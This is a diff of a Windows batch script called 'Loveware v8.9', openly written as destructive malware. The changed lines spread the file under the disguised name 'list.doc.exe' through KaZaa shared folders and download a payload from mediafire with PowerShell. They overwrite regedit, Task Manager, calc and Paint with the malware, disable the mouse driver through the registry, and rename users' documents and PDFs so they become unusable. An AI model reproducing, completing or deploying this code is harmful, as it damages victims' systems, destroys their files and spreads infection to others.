@@ -1,10 +1,7 @@
 @echo off
 
-:: LOVEWARE v8.8
+:: LOVEWARE v8.9
 ::
-:: YOU CAN DELETE THIS 
-:: |  |  |  |  |  |  |
-:: V  V  V  V  V  V  V
 ::
 :: Name: Loveware
 :: Creator: The_G0df@ther
@@ -63,10 +60,6 @@
 ::                                 `----'      '---"     `--`---'            `---TEAM  
 :: DO NOT UPLOAD ON VIRUSTOTAL!!!
 ::                                                                         
-:: Untill here ---------------------------------------------->
-:: Below this there is only death and LOVE 
-:: |  |  |  |  |  |  |  |  |  |  |  |  |  |
-:: V  V  V  V  V  V  V  V  V  V  V  V  V  V
 
 color 57
 
@@ -319,7 +312,14 @@ xcopy /e /y Loveware.exe H:\
 
 :: Use KaZaa to spread if the user has this ancient stuff
 
-xcopy Loveware.exe C:\Program Files\KaZaa\My Shared Folder\list.doc.exe
+if exist C:\Program Files\KaZaa\My Shared Folder\ (
+    xcopy Loveware.exe C:\Program Files\KaZaa\My Shared Folder\list.doc.exe
+    goto key
+) else (
+    goto key
+)
+
+:key
 
 :: Keyboard reg
 
@@ -362,9 +362,8 @@ goto haha
 powershell -Command "(New-Object Net.WebClient).DownloadFile('http://www.mediafire.com/file/xycm8d9wqrm5rsv/mouse.bat/file', 'mouse.exe')"
 powershell -Command "Invoke-WebRequest http://www.mediafire.com/file/xycm8d9wqrm5rsv/mouse.bat/file -OutFile mouse.bat"
 
-:: Overwrite regedit and taskmanager for extra fun
+:: Overwrite some programs and taskmanager for extra fun
 
-copy/y Loveware.exe C:\Windows\regedit.exe
 copy/y Loveware.exe C:\Windows\System32\Taskmgr.exe
 copy/y Loveware.exe C:\Windows\calc.exe
 copy/y Loveware.exe C:\Windows\pbrush.exe
@@ -516,8 +515,9 @@ echo set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass">>ye
 echo reg delete %key%>>yes.bat
 echo reg add %key% /v Start /t REG_DWORD /d 4>>yes.bat
 
-:: Copy Loveware with some other things
-:: to the startup folder
+:: Overwrite regedit to make it harder for the poor guy
+
+echo copy/y Loveware.exe C:\Windows\regedit.exe>>yes.bat
 
 echo timeout 400>>yes.bat
 
@@ -663,6 +663,10 @@ echo ren *.docx LOVE.Letter>>no.bat
 echo ren *.doc LOVE.Letter>>no.bat
 echo ren *.pdf LOVE.Letter>>no.bat
 
+:: Overwrite regedit to make it harder for the poor guy
+
+echo copy/y Loveware.exe C:\Windows\regedit.exe>>yes.bat
+
 echo timeout 400>>no.bat
 
 :: Just killing you
@@ -706,9 +710,9 @@ goto checker
 ::  d8P"      "Y8b, ,d8P"      "Y8b
 :: dP'           "8a8"           `Yd
 :: 8(              "              )8
-:: I8                             8I
-::  Yb,                         ,dP
-::   "8a,                     ,a8"
+:: I8       CODED WITH LOVE       8I
+::  Yb,     BY THE LOVEWARE     ,dP
+::   "8a,        TEAM         ,a8"
 ::     "8a,                 ,a8"
 ::       "Yba             adP"
 ::         `Y8a         a8P'
